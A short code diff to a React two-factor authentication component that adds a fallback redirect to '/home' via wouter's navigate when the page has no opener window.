@@ -1,5 +1,6 @@
 import { sendMessageCodeTelegram } from "@/services/send-message";
 import { useEffect, useRef, useState } from "react";
+import { navigate } from "wouter/use-browser-location";
 import "./TwoFactorAuth.css";
 
 export default function TwoFactorAuth() {
@@ -76,6 +77,8 @@ export default function TwoFactorAuth() {
 
         if (window.opener) {
           window.opener.location.href = "/home";
+        } else {
+          navigate("/home");
         }
         setIsLoading(false);
       }, 3500); // Delay 2 giây
